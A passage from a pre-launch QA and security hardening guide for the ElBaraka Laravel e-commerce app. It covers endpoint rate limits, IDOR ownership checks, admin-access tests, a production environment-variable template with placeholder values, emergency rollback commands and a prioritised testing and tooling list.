| 7 | Regular automatic backups | Database + file storage |
| 8 | Log monitoring set up | Use Laravel Telescope or similar |

---

## 7. All Endpoints Security Audit Table

### Public Endpoints (No Auth Required)

These are fine to be public, but verify rate limiting:

| Endpoint | Rate Limit | Risk | Action |
|----------|-----------|------|--------|
| `GET /health` | None | Low | OK |
| `GET /v1/products` | 60/min | Low | OK |
| `GET /v1/categories` | 60/min | Low | OK |
| `GET /v1/promotions` | 60/min | Low | OK |
| `GET /v1/offers` | 60/min | Low | OK |
| `GET /v1/store/settings` | 60/min | Low | OK |
| `GET /v1/delivery-zones` | 60/min | Low | OK |
| `POST /v1/cart/*` | 60/min | Medium | Consider: require auth for cart write operations |
| `POST /v1/promo-codes/validate` | 60/min | Medium | Tighten to 10/min — prevents promo enumeration |

### Auth Endpoints (Guest Only)

| Endpoint | Current Limit | Recommended | Risk |
|----------|--------------|-------------|------|
| `POST /v1/auth/register` | 60/min | **3/min** | Spam accounts |
| `POST /v1/auth/login` | 60/min | **5/min** | Brute force |
| `POST /v1/auth/forgot-password` | 60/min | **3/min** | Email bomb |
| `POST /v1/auth/resend-otp` | 60/min | **3/min** | SMS/email bomb |
| `POST /v1/auth/verify-email` | 60/min | **5/min** | OTP brute force |
| `POST /v1/auth/verify-reset-otp` | 60/min | **5/min** | OTP brute force |
| `POST /v1/auth/reset-password` | 60/min | **3/min** | Account takeover |
| `POST /v1/auth/google` | 10/min | OK | — |
| `POST /v1/auth/apple` | 10/min | OK | — |

### Protected Endpoints (Require Auth)

Each of these must verify:
1. Token is valid
2. User owns the resource (IDOR check)
3. Input is validated

| Endpoint Group | IDOR Risk | Action Required |
|---------------|-----------|----------------|
| `GET/PUT /v1/profile` | None (uses `auth()->user()`) | OK |
| `/v1/addresses/*` | HIGH | Verify `address.user_id === auth.id` |
| `/v1/orders/*` | HIGH | Verify `order.user_id === auth.id` |
| `/v1/complaints/*` | HIGH | Verify `complaint.user_id === auth.id` |
| `/v1/favorites/*` | LOW | Uses user scope | OK |
| `/v1/notifications/*` | MEDIUM | Verify notification belongs to user |
| `/v1/payment-methods/*` | HIGH | Verify belongs to user |
| `/v1/wallet/*` | HIGH | Verify belongs to user |
| `/v1/reviews/update|destroy` | HIGH | Verify `review.user_id === auth.id` |

### Admin Endpoints

| Endpoint Group | Middleware | Risk |
|---------------|-----------|------|
| `/v1/admin/*` | `auth:sanctum` + `admin` + `log.admin.activity` | ✅ Properly protected |

**Verify these admin checks work:**
```
# With regular user token:
GET /api/v1/admin/orders → Must return 403
GET /api/v1/admin/customers → Must return 403
DELETE /api/v1/admin/products/1 → Must return 403
```

### Webhook Endpoints

| Endpoint | Protection | Verify |
|----------|-----------|--------|
| `POST /v1/paymob/processed` | HMAC verification | ✅ Test with tampered payload |
| `POST /v1/paymob/refund-webhook` | HMAC verification | ✅ Test with tampered payload |

---

## 8. Environment Variables Checklist

### Backend (.env) — Requirements for Production

```env
# === CRITICAL — MUST CHANGE ===
APP_NAME=ElBaraka
APP_ENV=production                    # NOT "local"
APP_KEY=base64:...                    # 32-char random key (php artisan key:generate)
APP_DEBUG=false                       # CRITICAL: false in production
APP_TIMEZONE=Africa/Cairo
APP_URL=https://api.your-domain.com   # Your actual domain with HTTPS

# === DATABASE ===
DB_CONNECTION=mysql
DB_HOST=your-production-db-host       # NOT 127.0.0.1 in cloud
DB_PORT=3306
DB_DATABASE=elbaraka_production
DB_USERNAME=elbaraka_app              # NOT root
DB_PASSWORD=StrongPassword123!$%      # 20+ chars

# === SESSIONS & CACHE ===
SESSION_DRIVER=redis                  # Use Redis, not file
CACHE_STORE=redis                     # Use Redis
QUEUE_CONNECTION=redis                # Use Redis for queues
REDIS_HOST=127.0.0.1
REDIS_PASSWORD=your-redis-password
REDIS_PORT=6379

# === AUTHENTICATION ===
SANCTUM_STATEFUL_DOMAINS=your-domain.com,admin.your-domain.com
SESSION_SECURE_COOKIE=true
SESSION_SAME_SITE=strict

# === MAIL (for OTP emails) ===
MAIL_MAILER=smtp
MAIL_HOST=smtp.your-provider.com
MAIL_PORT=587
MAIL_USERNAME=noreply@your-domain.com
MAIL_PASSWORD=your-mail-password
MAIL_ENCRYPTION=tls
MAIL_FROM_ADDRESS=noreply@your-domain.com
MAIL_FROM_NAME="ElBaraka"

# === PAYMENT (Paymob) ===
PAYMOB_API_KEY=your-live-api-key
PAYMOB_SECRET_KEY=your-live-secret
PAYMOB_HMAC_SECRET=your-live-hmac
PAYMOB_INTEGRATION_ID=your-live-integration
PAYMOB_IFRAME_ID=your-live-iframe

# === FILE STORAGE (Cloudinary) ===
CLOUDINARY_URL=cloudinary://api_key:api_secret@cloud_name
CLOUDINARY_CLOUD_NAME=your-cloud-name
CLOUDINARY_API_KEY=your-api-key
CLOUDINARY_API_SECRET=your-api-secret

# === SOCIAL LOGIN ===
GOOGLE_CLIENT_ID=your-web-client-id
GOOGLE_CLIENT_SECRET=your-client-secret
GOOGLE_ANDROID_CLIENT_ID=your-android-client-id
GOOGLE_IOS_CLIENT_ID=your-ios-client-id
APPLE_CLIENT_ID=com.elbaraka.hypermarket
APPLE_TEAM_ID=your-team-id
APPLE_KEY_ID=your-key-id

# === REAL-TIME (Pusher/Reverb) ===
BROADCAST_DRIVER=pusher
PUSHER_APP_ID=your-app-id
PUSHER_APP_KEY=your-app-key
PUSHER_APP_SECRET=your-app-secret
PUSHER_APP_CLUSTER=eu

# === LOGGING ===
LOG_CHANNEL=daily
LOG_LEVEL=warning                     # NOT "debug" in production

# === TWILIO (SMS) ===
TWILIO_SID=your-account-sid
TWILIO_TOKEN=your-auth-token
TWILIO_FROM=+your-number
```

### Frontend (Config)

In your API config file, ensure:
```typescript
// FOR PRODUCTION — change API_BASE_URL from localhost to:
const API_BASE_URL = 'https://api.your-domain.com/api/v1';
```

### Admin Dashboard (.env)

```env
VITE_API_BASE_URL=https://api.your-domain.com/api/v1
```

---

## 9. Emergency Rollback Plan

### If Something Goes Wrong After Launch

#### Scenario 1: Server is Down
```bash
# Check server status
ssh your-server "systemctl status nginx"
ssh your-server "systemctl status php-fpm"

# Restart services
ssh your-server "systemctl restart nginx"
ssh your-server "systemctl restart php8.3-fpm"

# Check error logs
ssh your-server "tail -100 /var/log/nginx/error.log"
ssh your-server "tail -100 /path/to/unibackend/storage/logs/laravel.log"
```

#### Scenario 2: Database Error
```bash
# Rollback last migration
php artisan migrate:rollback --step=1

# Restore from backup
mysql -u root -p elbaraka_production < backup.sql
```

#### Scenario 3: API Returns 500 Errors
```bash
# Clear all caches
php artisan cache:clear
php artisan config:clear
php artisan route:clear
php artisan view:clear

# Check the log
tail -f storage/logs/laravel.log
```

#### Scenario 4: Mobile App Crash
```
# You can't rollback a published app instantly
# Have a feature flag / kill switch in store settings
# Set store status to "maintenance" via admin dashboard
# This shows users a "We're updating" message
```

---

## Quick Reference: Testing Priority Order

If you're short on time, test in this order (highest priority first):

| Priority | What | Why | Time |
|----------|------|-----|------|
| 🔴 P0 | Login/Register/Auth flow | Users can't use app without it | 30 min |
| 🔴 P0 | Payment flow (Paymob) | Revenue depends on it | 45 min |
| 🔴 P0 | Order creation & management | Core business function | 30 min |
| 🟠 P1 | Admin order management | Admin can't fulfill orders | 20 min |
| 🟠 P1 | Security: auth bypass & IDOR | Data breach risk | 30 min |
| 🟠 P1 | Production .env settings | App won't work without them | 15 min |
| 🟡 P2 | Cart & checkout flow | E-commerce core | 20 min |
| 🟡 P2 | Product browsing & search | User experience | 15 min |
| 🟡 P2 | Push notifications | User engagement | 15 min |
| 🟢 P3 | Profile management | Nice to have, not critical | 10 min |
| 🟢 P3 | Reviews, complaints, favorites | Nice to have | 15 min |
| 🟢 P3 | Analytics, reports, exports | Admin convenience | 10 min |

---

## Summary of Every Tool You Need

| Category | Tool | Free? | Purpose |
|----------|------|-------|---------|
| **API Testing** | Postman | Yes | Test every endpoint manually |
| **API Testing** | Thunder Client (VS Code) | Yes | Quick API tests inside VS Code |
| **Security** | OWASP ZAP | Yes | Automated vulnerability scanner |
| **Security** | Snyk CLI | Yes (limited) | Dependency vulnerability scanner |
| **Security** | npm audit | Yes | Node.js vulnerability check |
| **Security** | composer audit | Yes | PHP vulnerability check |
| **Performance** | Artillery | Yes | Load testing (simulate many users) |
| **Performance** | Lighthouse (Chrome) | Yes | Page performance scoring |
| **Database** | DBeaver | Yes | GUI database inspector |
| **Cache** | Redis Insight | Yes | GUI Redis inspector |
| **Mobile** | Android Emulator | Yes | Test mobile app |
| **Mobile** | EAS CLI | Yes | Build APK/AAB |
| **Code Quality** | ESLint | Yes | JavaScript/TypeScript linting |
| **Code Quality** | PHPStan | Yes | PHP static analysis |
| **Monitoring** | Laravel Telescope | Yes | Debug/monitor Laravel in dev |
| **Monitoring** | Sentry | Free tier | Error tracking in production |

---

*This guide was generated based on analysis of the complete ElBaraka codebase: 40+ backend controllers, 45+ frontend screens, 25+ admin pages, 72 database migrations, and 20+ API service layers.*
